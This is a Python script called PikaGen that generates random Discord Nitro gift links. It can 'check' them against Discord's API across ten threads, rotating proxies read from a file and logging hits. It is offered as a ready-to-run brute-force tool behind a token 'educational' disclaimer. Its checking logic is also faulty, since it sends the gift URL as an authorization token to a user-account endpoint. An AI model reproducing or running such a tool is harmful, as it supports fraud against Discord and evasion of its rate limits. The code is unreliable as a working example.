import random
import string
import threading
import requests
import os
import time
import platform

def clear_screen():
    if platform.system() == 'Windows':
        os.system('cls')  # Windows
    else:
        os.system('clear')  # macOS and Linux

print("""\
WARNING: THIS GENERATOR IS ONLY FOR EDUCATIONAL AND TESTING PURPOSES.
BY USING THIS TOOL YOU MUST AGREE THAT, WE WILL NOT BE RESPONSIBLE FOR ANY
ILLEGAL USAGE OF THIS SOFTWARE. """)

time.sleep(3)
clear_screen()

print("""\
██▓███   ██▓ ██ ▄█▀▄▄▄         ▄████ ▓█████  ███▄    █
▓██░  ██▒▓██▒ ██▄█▒▒████▄      ██▒ ▀█▒▓█   ▀  ██ ▀█   █
▓██░ ██▓▒▒██▒▓███▄░▒██  ▀█▄   ▒██░▄▄▄░▒███   ▓██  ▀█ ██▒
▒██▄█▓▒ ▒░██░▓██ █▄░██▄▄▄▄██  ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒
▒██▒ ░  ░░██░▒██▒ █▄▓█   ▓██▒ ░▒▓███▀▒░▒████▒▒██░   ▓██░
▒▓▒░ ░  ░░▓  ▒ ▒▒ ▓▒▒▒   ▓▒█░  ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒
░▒ ░      ▒ ░░ ░▒ ▒░ ▒   ▒▒ ░   ░   ░  ░ ░  ░░ ░░   ░ ▒░
░░        ▒ ░░ ░░ ░  ░   ▒    ░ ░   ░    ░      ░   ░ ░ 
░  ░  ░        ░  ░      ░     ░  ░         ░            """)

print("")
print("------------------------------------------------------------")

print("Welcome to PikaGen Created By ! PikaTheCutest#4514 on Discord!")
print("This will generate unlimited amounts of codes every time you run it!")

def get_random_alphanumeric_string(letters_count, digits_count):
    sample_str = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
    sample_str += ''.join((random.choice(string.digits) for i in range(digits_count)))

    sample_list = list(sample_str)
    random.shuffle(sample_list)
    final_string = ''.join(sample_list)
    return final_string

valid = 0
invalid = 0
totalcodes = 0

def results():
    if check_nitro == 'y':
        print("Generating Nitro Codes...")
        print("---------------------------")
        print(f"Valid: {valid}")
        print(f"Invalid: {invalid}")
        print(f"Generated: {totalcodes}/{looptimes}")

    else:
        print("Generating Nitro Codes...")
        print("---------------------------")
        print(f"Generated: {totalcodes}/{looptimes}")


looptimes = int(input('How many nitro codes would you like to generate? '))
check_nitro = input('Would you like to check the nitro codes generated? (y/n) ')

os.system('clear')

if check_nitro == 'y':
    folder_path = "/Users/bai/Desktop/PikaGen"  # CHANGE THIS TO YOUR OWN DIRECTORY!
    proxy_file = os.path.join(folder_path, "proxy.txt")
    hit_file = os.path.join(folder_path, "hits.txt")

    def check_nitro_code(code):
        global proxy_list
        global hit_file
        global valid, invalid, totalcodes
        headers = {'Content-Type': 'application/json', 'authorization': code}
        try:
            proxy = random.choice(proxy_list)
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers,
                                    proxies={'http': proxy, 'https': proxy}, timeout=5)
            if response.status_code == 200:
                valid = valid+1
                totalcodes = totalcodes+1
                clear_screen()
                results()
                with open(hit_file, 'a') as hits:
                    hits.write(code + '\n')
            else:
                invalid = invalid+1
                totalcodes = totalcodes+1
                clear_screen()
                results()
        except:
            invalid = invalid+1
            totalcodes = totalcodes+1
            clear_screen()
            results()

    with open(proxy_file, "r") as proxies:
        proxy_list = proxies.read().splitlines()

    threads = 10
    thread_list = []

    def generate_codes():
        for x in range(looptimes // threads):
            code = "https://discord.gift/" + get_random_alphanumeric_string(19, 0)
            check_nitro_code(code)

    for x in range(threads):
        thread = threading.Thread(target=generate_codes)
        thread_list.append(thread)

    for thread in thread_list:
        thread.start()

    for thread in thread_list:
        thread.join()

else:
    unchecked_file = os.path.join(os.getcwd(), "unchecked.txt")

    # Clear the contents of the file before adding new codes
    open(unchecked_file, "w").close()

    with open(unchecked_file, "a") as unchecked:
        for x in range(looptimes):
            code = "https://discord.gift/" + get_random_alphanumeric_string(19, 0)
            unchecked.write(code + "\n")
            print("Generating Nitro Codes...")
            print("---------------------------")
            totalcodes = totalcodes+1
            clear_screen()
            results()

print("")

print("NOTE: IF YOU DID NOT USE THE CHECKER, THE UNCHECKED DISCORD NITRO CODES WILL BE AUTOMATICALLY PUT IN unchecked.txt FILE!")
      
print("")

print("Press Enter to Exit.")
input()
